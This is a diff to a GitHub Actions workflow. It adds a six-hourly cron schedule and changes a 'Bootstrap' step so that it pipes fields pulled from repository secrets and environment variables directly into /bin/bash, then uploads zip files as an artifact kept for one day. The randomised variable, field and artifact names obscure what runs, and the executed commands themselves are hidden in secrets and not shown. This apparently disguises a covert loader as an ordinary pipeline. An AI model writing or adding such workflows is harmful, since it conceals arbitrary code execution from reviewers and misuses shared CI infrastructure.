@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 0,6,12,18 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Bootstrap
         env:
-          koenz802: ${{ secrets.koenz802 }}
+          tf35833: ${{ secrets.tf35833 }}
         run: |
-          printf '%s' "$koenz802" | jq -r .kcnr6452 | /bin/bash
-          echo $jbt6 | jq -r .fy12393 | /bin/bash
-          echo $rrypo500 | jq -r .qye3 | /bin/bash
-          echo $avm1 | jq -r .plhm51 | /bin/bash
+          printf '%s' "$tf35833" | jq -r .ppap68258 | /bin/bash
+          printf '%s' "$j12901" | jq -r .wfdg04 | /bin/bash
+          echo $imfl6427 | jq -r .fsn33941 | /bin/bash
+          printf '%s' "$mqgyv53312" | jq -r .phv7 | /bin/bash
+          echo $bkw56 | jq -r .syj778 | /bin/bash
+          echo $yajou1 | jq -r .sl894 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
         with:
-          name: ThgqnKT0
+          name: I29Ht90h
           path: "*.zip"
           retention-days: 1
